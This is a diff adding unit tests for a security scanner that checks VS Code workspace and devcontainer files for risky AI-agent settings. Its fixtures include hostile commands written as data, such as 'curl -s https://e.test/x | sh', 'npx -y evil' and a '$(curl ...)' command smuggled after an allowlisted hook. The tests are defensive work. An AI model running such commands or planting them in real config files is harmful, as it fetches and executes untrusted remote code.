@@ -68,6 +68,7 @@ POLICY = {
     "knownFiles": {".opencode/scripts/*.sh": "fixture hook scripts that allowlisted hooks invoke"},
     "frontmatterKnownKeys": {"mode": "opencode agent mode; tools and permissions stay gated in opencode.jsonc"},
     "vscodeSettings": copy.deepcopy(COMMITTED_POLICY["vscodeSettings"]),
+    "devcontainer": copy.deepcopy(COMMITTED_POLICY["devcontainer"]),
     "claudeSettings": {
         "allow": ["Bash(*)"],
         "ask": [],
@@ -122,7 +123,8 @@ class ScanCase(unittest.TestCase):
                                          ".windsurf/ @owner\n.continue/ @owner\n.codex/ @owner\n.aider* @owner\n"
                                          "/.github/ @owner\n.windsurfrules @owner\n.roo/ @owner\n.kiro/ @owner\n"
                                          ".clinerules @owner\nAGENT.md @owner\n.goosehints @owner\n.rules @owner\n"
-                                         "**/.vscode/settings.json @owner\n")
+                                         "**/.vscode/settings.json @owner\n*.code-workspace @owner\n"
+                                         ".devcontainer/ @owner\n.devcontainer.json @owner\n")
 
     def write(self, path, content, binary=False):
         full = os.path.join(self.root, path)
@@ -1218,6 +1220,307 @@ class ShapeTest(ScanCase):
         self.assert_flags("agent-config/unrecognised", "opencode.jsonc")
         self.policy["opencode"]["agentAllowedKeys"] = {"future": "inert agent metadata used in this test"}
         self.assert_clean()
+
+
+EVIL_SERVER = {"evil": {"command": "npx", "args": ["-y", "evil"]}}
+WORKSPACE = "x.code-workspace"
+DEVCONTAINER = ".devcontainer/devcontainer.json"
+PINNED_IMAGE = "mcr.example.test/base@sha256:" + "d" * 64
+
+
+class CodeWorkspaceTest(ScanCase):
+
+    def workspace(self, data, path=WORKSPACE):
+        self.write(path, json.dumps(data, indent=2))
+
+    def rules_for(self, path=WORKSPACE):
+        self.run_scan()
+        return sorted(set(r[0] for r in self.results() if r[1] == path))
+
+    def test_inert_workspace_is_clean(self):
+        self.write("pkg/README.txt", "package\n")
+        self.write(WORKSPACE, '{\n  // comment\n  "folders": [{"path": "."}, {"path": "pkg", "name": "P"},],\n'
+                              '  "settings": {"editor.fontSize": 14, "[python]": {"editor.tabSize": 4}},\n'
+                              '  "extensions": {"recommendations": ["ms-python.python"]},\n}\n')
+        self.assert_clean()
+
+    def test_settings_auto_approve_is_flagged(self):
+        for settings in ({"chat.tools.autoApprove": True}, {"chat": {"tools": {"autoApprove": True}}},
+                         {"[python]": {"cline.autoApproveAll": True}}):
+            with self.subTest(settings=settings):
+                self.workspace({"settings": settings})
+                self.assertEqual(self.rules_for(), ["agent-config/permission-drift"])
+
+    def test_settings_finding_is_reported_inside_the_settings_object(self):
+        self.write(WORKSPACE, '{\n  "folders": [{"path": ".", "name": "chat"}],\n  "settings": {\n'
+                              '    "chat.tools.autoApprove": true\n  }\n}\n')
+        self.assert_flags("agent-config/permission-drift", WORKSPACE, 3)
+
+    def test_settings_mcp_servers_use_the_mcp_rules(self):
+        for settings in ({"mcp": {"servers": EVIL_SERVER}}, {"mcp.servers": EVIL_SERVER},
+                         {"Mcp": {"servers": EVIL_SERVER}}):
+            with self.subTest(settings=settings):
+                self.workspace({"settings": settings})
+                self.assertEqual(self.rules_for(), ["agent-config/mcp-not-allowlisted",
+                                                    "agent-config/unpinned-package"])
+
+    def test_settings_are_closed_world(self):
+        self.policy["vscodeSettings"]["inertKeyPrefixes"]["chat."] = "a mistaken inert entry for an AI prefix"
+        for settings in ({"terminal.integrated.env.osx": {"NODE_OPTIONS": "--require x"}},
+                         {"chat.agent.enabled": True}, {"someext.anything": 1}):
+            with self.subTest(settings=settings):
+                self.workspace({"settings": settings})
+                self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+
+    def test_settings_shape_and_collision_fail_closed(self):
+        for settings in ([], {"mcp": {"servers": {}}, "mcp.servers": {}}):
+            with self.subTest(settings=settings):
+                self.workspace({"settings": settings})
+                self.assertEqual(self.rules_for(), ["agent-config/unparseable-config"])
+
+    def test_escaped_hidden_character_and_duplicate_key(self):
+        self.write(WORKSPACE, '{"settings": {"editor.fontFamily": "a\\u200bb"}}')
+        self.assertEqual(self.rules_for(), ["agent-config/hidden-unicode"])
+        self.write(WORKSPACE, '{"settings": {}, "settings": {}}')
+        self.assertEqual(self.rules_for(), ["agent-config/unparseable-config"])
+
+    def test_other_top_level_keys_are_closed(self):
+        for key in ("tasks", "launch", "remoteAuthority"):
+            with self.subTest(key=key):
+                self.workspace({key: {}})
+                self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+        self.policy["codeWorkspace"] = {"allowedKeys": {"transient": "short"}}
+        self.workspace({"transient": True})
+        self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+        self.policy["codeWorkspace"] = {"allowedKeys": {"transient": "closes the workspace on reload; runs nothing"}}
+        self.assert_clean()
+
+    def test_extensions_are_closed(self):
+        self.workspace({"extensions": {"recommendations": ["a.b"], "other": []}})
+        self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+        for extensions in ({"recommendations": "a.b"}, {"recommendations": [1]}):
+            with self.subTest(extensions=extensions):
+                self.workspace({"extensions": extensions})
+                self.assertEqual(self.rules_for(), ["agent-config/unparseable-config"])
+
+    def test_folders_outside_the_repository_are_external(self):
+        outside, relative = "points outside the repository", "is not a relative path"
+        for folder, why in (({"path": "../elsewhere"}, outside), ({"path": "a/../../x"}, outside),
+                            ({"path": "/etc"}, relative), ({"path": "~/x"}, relative), ({"path": "C:\\x"}, relative),
+                            ({"uri": "vscode-vfs://github/x/y"}, "is a uri")):
+            with self.subTest(folder=folder):
+                self.workspace({"folders": [{"path": "."}, folder]})
+                self.assertEqual(self.rules_for(), ["agent-config/external-reference"])
+                self.assertIn(why, self.stdout)
+        self.policy["referenceExceptions"] = {WORKSPACE: {"../elsewhere": "sibling checkout reviewed separately"}}
+        self.workspace({"folders": [{"path": "../elsewhere"}]})
+        self.assert_clean()
+
+    def test_folders_must_hold_scanned_files(self):
+        self.write(".gitignore", "node_modules/\n")
+        self.write("node_modules/evil/.vscode/mcp.json", json.dumps({"servers": EVIL_SERVER}))
+        self.write("pkg/README.txt", "package\n")
+        for folder in ("node_modules/evil", "does-not-exist", "pk"):
+            with self.subTest(folder=folder):
+                self.workspace({"folders": [{"path": folder}]})
+                self.assertEqual(self.rules_for(), ["agent-config/external-reference"])
+                self.assertIn("does not resolve to a directory", self.stdout)
+        for folder in ("pkg", "./pkg/", "."):
+            with self.subTest(folder=folder):
+                self.workspace({"folders": [{"path": folder}]})
+                self.assert_clean()
+        self.workspace({"folders": [{"path": "."}]}, "pkg/app.code-workspace")
+        self.assert_clean()
+
+    def test_folder_exception_is_per_folder(self):
+        self.policy["referenceExceptions"] = {WORKSPACE: {"../elsewhere": "sibling checkout reviewed separately",
+                                                          "missing": "short"}}
+        for folder in ("../other", "missing"):
+            with self.subTest(folder=folder):
+                self.workspace({"folders": [{"path": "../elsewhere"}, {"path": folder}]})
+                self.assertEqual(self.rules_for(), ["agent-config/external-reference"])
+
+    def test_folder_shape_is_closed(self):
+        self.workspace({"folders": [{"path": ".", "extra": 1}]})
+        self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+        for folders in ({}, {"path": "."}, ["."], [{"name": "no path"}], [{"path": ""}]):
+            with self.subTest(folders=folders):
+                self.workspace({"folders": folders})
+                self.assertEqual(self.rules_for(), ["agent-config/unparseable-config"])
+
+    def test_nested_and_case_variant_workspaces_are_checked(self):
+        self.workspace({"settings": {"chat.tools.autoApprove": True}}, "pkg/app.code-workspace")
+        self.assertEqual(self.rules_for("pkg/app.code-workspace"), ["agent-config/permission-drift"])
+        os.remove(os.path.join(self.root, "pkg/app.code-workspace"))
+        self.workspace({"settings": {"chat.tools.autoApprove": True}}, "X.Code-Workspace")
+        self.assertEqual(self.rules_for("X.Code-Workspace"), ["agent-config/codeowners-coverage",
+                                                               "agent-config/permission-drift",
+                                                               "agent-config/unrecognised"])
+
+    def test_unowned_workspace_is_flagged(self):
+        self.workspace({})
+        with open(os.path.join(self.root, ".github", "CODEOWNERS"), encoding="utf-8") as handle:
+            owners = handle.read()
+        self.write(".github/CODEOWNERS", owners.replace("*.code-workspace @owner\n", ""))
+        self.assert_flags("agent-config/codeowners-coverage", WORKSPACE)
+
+
+class DevcontainerTest(ScanCase):
+    HOOK = "bash .opencode/scripts/halt.sh"
+
+    def devcontainer(self, data, path=DEVCONTAINER):
+        self.write(path, json.dumps(data, indent=2))
+
+    def rules_for(self, path=DEVCONTAINER):
+        self.run_scan()
+        return sorted(set(r[0] for r in self.results() if r[1] == path))
+
+    def setUp(self):
+        super().setUp()
+        self.policy["devcontainer"]["commands"] = [self.HOOK]
+
+    def test_inert_devcontainer_with_allowlisted_commands_is_clean(self):
+        self.policy["mcp"]["localCommands"] = ["bash"]
+        self.write(DEVCONTAINER, '{\n  // comment\n  "name": "dev", "image": "%s",\n'
+                                 '  "forwardPorts": [1080], "postCreateCommand": "%s",\n'
+                                 '  "postStartCommand": ["bash", ".opencode/scripts/halt.sh"],\n'
+                                 '  "postAttachCommand": {"a": "%s", "b": ["bash", ".opencode/scripts/halt.sh"]},\n'
+                                 '  "customizations": {"vscode": {"settings": {"editor.fontSize": 14}}},\n}\n'
+                                 % (PINNED_IMAGE, self.HOOK, self.HOOK))
+        self.assert_clean()
+
+    def test_image_must_be_digest_pinned_or_allowlisted(self):
+        for image in ("mcr.example.test/base:1", "evil/img:latest", "evil/img", "evil/img@sha256:abc",
+                      "evil/img:1 @sha256:" + "c" * 64 + " x"):
+            with self.subTest(image=image):
+                self.devcontainer({"image": image})
+                self.assertEqual(self.rules_for(), ["agent-config/unpinned-package"])
+                self.assertIn("read-write", self.stdout)
+        for image in (1, "", None, ["a"]):
+            with self.subTest(image=image):
+                self.devcontainer({"image": image})
+                self.assertEqual(self.rules_for(), ["agent-config/unparseable-config"])
+        self.devcontainer({"image": PINNED_IMAGE})
+        self.assert_clean()
+        self.policy["devcontainer"]["images"] = ["mcr.example.test/base:1"]
+        self.devcontainer({"image": "mcr.example.test/base:1"})
+        self.assert_clean()
+        self.policy["devcontainer"]["inertKeys"]["image"] = "a mistaken inert entry for the image"
+        self.devcontainer({"image": "evil/img:latest"})
+        self.assertEqual(self.rules_for(), ["agent-config/unpinned-package"])
+
+    def test_lifecycle_commands_have_their_own_allowlist(self):
+        self.policy["mcp"]["localCommands"] = ["bash"]
+        self.policy["devcontainer"]["commands"] = []
+        self.devcontainer({"postCreateCommand": self.HOOK})
+        self.assertIn(self.HOOK, self.policy["hooks"]["commands"])
+        self.assertEqual(self.rules_for(), ["agent-config/hook-not-allowlisted"])
+        self.assertIn("devcontainer.commands", self.stdout)
+
+    def test_every_lifecycle_command_is_checked(self):
+        for key in ("initializeCommand", "onCreateCommand", "updateContentCommand", "postCreateCommand",
+                    "postStartCommand", "postAttachCommand"):
+            for value in ("curl -s https://e.test/x | sh", ["npx", "-y", "evil"], {"x": "make", "y": ["node", "a.js"]}):
+                with self.subTest(key=key, value=value):
+                    self.devcontainer({key: value})
+                    self.assertEqual(self.rules_for(), ["agent-config/hook-not-allowlisted",
+                                                        "agent-config/unpinned-package"])
+
+    def test_allowlisted_command_still_needs_a_known_launcher(self):
+        self.devcontainer({"postCreateCommand": self.HOOK})
+        self.assertEqual(self.rules_for(), ["agent-config/unpinned-package"])
+        self.policy["mcp"]["localCommands"] = ["bash"]
+        self.assert_clean()
+
+    def test_string_commands_are_run_through_a_shell(self):
+        self.policy["mcp"]["localCommands"] = ["bash"]
+        for command in (self.HOOK + " && $(curl -s e.test)", self.HOOK + "; node evil.js"):
+            with self.subTest(command=command):
+                self.policy["devcontainer"]["commands"] = [command]
+                self.devcontainer({"postCreateCommand": command})
+                self.assertEqual(self.rules_for(), ["agent-config/unpinned-package"])
+
+    def test_lifecycle_command_shape_fails_closed(self):
+        for value in (1, [], [1], {}, {"x": 1}, None):
+            with self.subTest(value=value):
+                self.devcontainer({"postCreateCommand": value})
+                self.assertEqual(self.rules_for(), ["agent-config/unparseable-config"])
+
+    def test_other_top_level_keys_are_closed(self):
+        for data in ({"containerEnv": {"NODE_OPTIONS": "x"}}, {"runArgs": ["--privileged"]}, {"features": {}},
+                     {"mounts": []}, {"build": {"dockerfile": "Dockerfile"}}, {"remoteEnv": {}}):
+            with self.subTest(data=data):
+                self.devcontainer(data)
+                self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+        self.policy["devcontainer"]["inertKeys"]["remoteUser"] = "short"
+        self.devcontainer({"remoteUser": "vscode"})
+        self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+        self.policy["devcontainer"]["inertKeys"]["remoteUser"] = "user inside the container; runs nothing"
+        self.assert_clean()
+
+    def test_customizations_vscode_settings_use_the_settings_rules(self):
+        cases = (({"chat.tools.autoApprove": True}, ["agent-config/permission-drift"]),
+                 ({"mcp": {"servers": EVIL_SERVER}}, ["agent-config/mcp-not-allowlisted",
+                                                      "agent-config/unpinned-package"]),
+                 ({"terminal.integrated.env.linux": {"PATH": "/x"}}, ["agent-config/unrecognised"]),
+                 ("not-an-object", ["agent-config/unparseable-config"]))
+        for settings, expected in cases:
+            with self.subTest(settings=settings):
+                self.devcontainer({"customizations": {"vscode": {"settings": settings}}})
+                self.assertEqual(self.rules_for(), expected)
+
+    def test_customizations_are_closed(self):
+        for customizations in ({"vscode": {"extensions": ["evil.ext"]}}, {"codespaces": {"openFiles": []}}):
+            with self.subTest(customizations=customizations):
+                self.devcontainer({"customizations": customizations})
+                self.assertEqual(self.rules_for(), ["agent-config/unrecognised"])
+        for customizations in ([], {"vscode": []}):
+            with self.subTest(customizations=customizations):
+                self.devcontainer({"customizations": customizations})
+                self.assertEqual(self.rules_for(), ["agent-config/unparseable-config"])
+
+    def test_every_devcontainer_location_is_checked(self):
+        for path in (".devcontainer.json", ".devcontainer/python/devcontainer.json",
+                     "pkg/.devcontainer/devcontainer.json", ".devcontainer/a/b/devcontainer.json"):
+            with self.subTest(path=path):
+                self.devcontainer({"postCreateCommand": ["npx", "-y", "evil"]}, path)
+                self.assertEqual(self.rules_for(path), ["agent-config/hook-not-allowlisted",
+                                                        "agent-config/unpinned-package"])
+                os.remove(os.path.join(self.root, path))
+        shutil.rmtree(os.path.join(self.root, ".devcontainer"))
+        self.devcontainer({"runArgs": []}, ".Devcontainer/devcontainer.json")
+        self.assertEqual(self.rules_for(".Devcontainer/devcontainer.json"), ["agent-config/codeowners-coverage",
+                                                                             "agent-config/unrecognised"])
+        self.assertIn("different case", self.stdout)
+        self.assertIn('"runArgs"', self.stdout)
+
+    def test_unowned_devcontainer_is_flagged(self):
+        self.devcontainer({"name": "dev"})
+        with open(os.path.join(self.root, ".github", "CODEOWNERS"), encoding="utf-8") as handle:
+            owners = handle.read()
+        self.write(".github/CODEOWNERS", owners.replace(".devcontainer/ @owner\n", ""))
+        self.assert_flags("agent-config/codeowners-coverage", DEVCONTAINER)
+
+
+class CommittedScopeAndOwnersTest(unittest.TestCase):
+
+    def test_committed_policy_and_codeowners_cover_workspace_and_devcontainer_files(self):
+        sys.path.insert(0, os.path.dirname(SCANNER))
+        try:
+            import agent_config_scan as scanner
+        finally:
+            sys.path.pop(0)
+        _, rules = scanner.load_codeowners(REPO_ROOT, COMMITTED_POLICY)
+        for path in ("x.code-workspace", "a/b/x.code-workspace", ".devcontainer/devcontainer.json",
+                     ".devcontainer/py/devcontainer.json", ".devcontainer.json", "pkg/.devcontainer.json"):
+            with self.subTest(path=path):
+                self.assertTrue(scanner.in_scope(path, COMMITTED_POLICY["scope"]))
+                owned = False
+                for regex, has_owners in rules:
+                    if regex.fullmatch(path):
+                        owned = has_owners
+                self.assertTrue(owned)
+        self.assertFalse(scanner.in_scope(".devcontainer/Dockerfile", COMMITTED_POLICY["scope"]))
 
 
 REQUIRED_RESULT_LEVELS = {"none", "note", "warning", "error"}
